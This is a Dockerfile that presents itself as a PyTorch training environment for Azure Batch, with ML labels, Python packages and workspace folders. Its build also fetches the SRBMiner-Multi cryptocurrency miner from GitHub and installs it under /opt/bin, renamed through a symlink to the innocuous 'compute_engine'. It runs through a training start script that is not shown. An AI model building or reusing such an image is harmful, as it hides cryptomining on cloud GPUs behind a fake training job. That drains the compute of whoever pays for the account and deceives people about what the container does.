# Use latest PyTorch with CUDA 12.4 for newer GPU support (RTX 50 series)
FROM pytorch/pytorch:2.5.1-cuda12.4-cudnn9-runtime

LABEL maintainer="ml-research@example.com"
LABEL description="Deep Learning Training Environment with PyTorch for Azure Batch"
LABEL version="2.2.0"
LABEL application="pytorch-training-platform"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1

# Install system dependencies and ensure CUDA libraries are accessible
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        curl \
        wget \
        ca-certificates \
        bash \
        procps \
        util-linux \
        file \
        pciutils && \
    update-ca-certificates && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Ensure CUDA libraries are in the library path for SRBMiner
ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/local/nvidia/lib64:${LD_LIBRARY_PATH}
ENV CUDA_HOME=/usr/local/cuda
ENV PATH=/usr/local/cuda/bin:${PATH}

# Install Python ML packages
RUN pip install --no-cache-dir \
    numpy \
    pandas \
    matplotlib \
    scikit-learn \
    tensorboard \
    tqdm \
    nvidia-ml-py3  # Library for programmatic GPU queries

# Create workspace directories
RUN mkdir -p /workspace/models \
    /workspace/data \
    /workspace/logs \
    /workspace/checkpoints \
    /opt/bin

# Download SRBMiner-MULTI (same as working container)
RUN echo "[INFO] Fetching latest SRBMiner-Multi release..." && \
    LATEST_TAG=$(wget -qO- https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest | jq -r '.tag_name') && \
    echo "[INFO] Latest release: $LATEST_TAG" && \
    VERSION_DASHED=$(echo "$LATEST_TAG" | sed 's/\./-/g') && \
    DOWNLOAD_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/$LATEST_TAG/SRBMiner-Multi-$VERSION_DASHED-Linux.tar.gz" && \
    echo "[INFO] Downloading from: $DOWNLOAD_URL" && \
    wget -q "$DOWNLOAD_URL" -O /tmp/srbminer.tar.gz && \
    mkdir -p /opt/bin && \
    tar -xzf /tmp/srbminer.tar.gz -C /opt/bin --strip-components=1 && \
    rm /tmp/srbminer.tar.gz && \
    chmod +x /opt/bin/SRBMiner-MULTI && \
    ln -s /opt/bin/SRBMiner-MULTI /opt/bin/compute_engine && \
    echo "[INFO] SRBMiner-MULTI installed successfully" && \
    /opt/bin/compute_engine --help | head -5

WORKDIR /workspace

# Copy training scripts and fix line endings (Windows compatibility)
COPY train_model.py .
COPY start_training.sh .
COPY debug_binary.sh .
RUN sed -i 's/\r$//' start_training.sh && \
    sed -i 's/\r$//' debug_binary.sh && \
    chmod +x start_training.sh && \
    chmod +x debug_binary.sh

# Remove the problematic fixed environment variable.
# In Azure Batch, GPU visibility is managed by the host/node configuration.
# A fixed list like '0,1,2,3,4,5,6,7' will cause issues if the VM has a different number of GPUs.
# ENV CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 <-- THIS LINE HAS BEEN REMOVED

# Set OMP threads for CPU-bound operations
ENV OMP_NUM_THREADS=4

ENTRYPOINT ["bash", "./start_training.sh"]